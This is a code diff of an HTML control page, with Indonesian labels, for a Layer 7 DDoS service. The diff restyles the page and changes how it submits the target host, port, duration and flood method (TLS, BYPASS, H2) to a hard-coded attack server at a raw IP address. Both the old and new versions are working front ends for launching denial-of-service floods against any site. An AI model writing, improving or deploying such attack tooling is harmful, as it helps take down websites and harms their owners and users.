@@ -3,90 +3,86 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DDoS Panel Layer 7</title>
+    <title>Attack Panel</title>
     <style>
         body {
-            background-color: #121212;
-            color: #fff;
-            font-family: monospace;
+            font-family: Arial, sans-serif;
             text-align: center;
-            padding: 20px;
+            background-color: #121212;
+            color: white;
         }
-        h1 {
-            color: red;
-            text-shadow: 0 0 10px red;
+        .container {
+            margin-top: 50px;
         }
         input, select, button {
-            margin: 10px;
+            display: block;
+            margin: 10px auto;
             padding: 10px;
             font-size: 16px;
-            border: none;
-            border-radius: 5px;
-        }
-        input, select {
-            background-color: #222;
-            color: white;
         }
         button {
             background-color: red;
             color: white;
+            border: none;
             cursor: pointer;
-            transition: 0.3s;
         }
         button:hover {
             background-color: darkred;
         }
-        #log {
+        .log {
             margin-top: 20px;
-            padding: 10px;
-            background-color: #222;
-            text-align: left;
-            height: 100px;
-            overflow-y: auto;
+            font-size: 14px;
+            white-space: pre-line;
         }
     </style>
 </head>
 <body>
 
-    <h1>DDoS Panel</h1>
-    <input type="text" id="host" placeholder="Masukkan Host (IP/Domain)">
-    <input type="number" id="port" placeholder="Port (80, 443, dll.)">
-    <input type="number" id="time" placeholder="Durasi Serangan (detik)">
-    <select id="method">
-        <option value="tls">TLS</option>
-        <option value="bypass">BYPASS</option>
-        <option value="h2">H2</option>
-    </select>
-    <button onclick="startAttack()">Start Attack</button>
+    <div class="container">
+        <h1>🔥 Attack Panel 🔥</h1>
+        <label>Target Host:</label>
+        <input type="text" id="host" placeholder="https://target.com">
 
-    <div id="log">Log serangan akan muncul di sini...</div>
+        <label>Port:</label>
+        <input type="number" id="port" placeholder="80">
+
+        <label>Time (Seconds):</label>
+        <input type="number" id="time" placeholder="60">
+
+        <label>Methods:</label>
+        <select id="methods">
+            <option value="tls">TLS</option>
+            <option value="bypass">Bypass</option>
+            <option value="h2">H2</option>
+        </select>
+
+        <button onclick="sendAttack()">🚀 ATTACK!</button>
+
+        <div class="log" id="log"></div>
+    </div>
 
     <script>
-        function startAttack() {
-            let host = document.getElementById("host").value;
-            let port = document.getElementById("port").value;
-            let time = document.getElementById("time").value;
-            let method = document.getElementById("method").value.toUpperCase();
-            let log = document.getElementById("log");
+        async function sendAttack() {
+            const host = document.getElementById('host').value;
+            const port = document.getElementById('port').value;
+            const time = document.getElementById('time').value;
+            const methods = document.getElementById('methods').value.toUpperCase(); // 🔥 Buat huruf besar otomatis
 
-            if (!host || !port || !time) {
-                log.innerHTML = "⚠️ Harap isi semua kolom!";
+            if (!host || !port || !time || !methods) {
+                alert("⚠️ Harap isi semua data!");
                 return;
             }
 
-            log.innerHTML = `🚀 Menyerang <b>${host}:${port}</b> dengan metode <b>${method}</b> selama <b>${time}</b> detik...`;
-
-            fetch("http://64.227.139.46:4877/attack", {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json",
-                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
-                },
-                body: JSON.stringify({ host, port, time, method })
-            })
-            .then(response => response.json())
-            .then(data => log.innerHTML += `<br>✅ Serangan dikirim: ${JSON.stringify(data)}`)
-            .catch(error => log.innerHTML += `<br>❌ Error: ${error}`);
+            const url = `http://64.227.139.46:4877/attack?host=${encodeURIComponent(host)}&port=${port}&time=${time}&methods=${methods}`;
+            
+            try {
+                document.getElementById("log").innerText = "🚀 Mengirim serangan...";
+                const response = await fetch(url);
+                const result = await response.json();
+                document.getElementById("log").innerText = JSON.stringify(result, null, 2);
+            } catch (error) {
+                document.getElementById("log").innerText = `❌ Error: ${error}`;
+            }
         }
     </script>
 
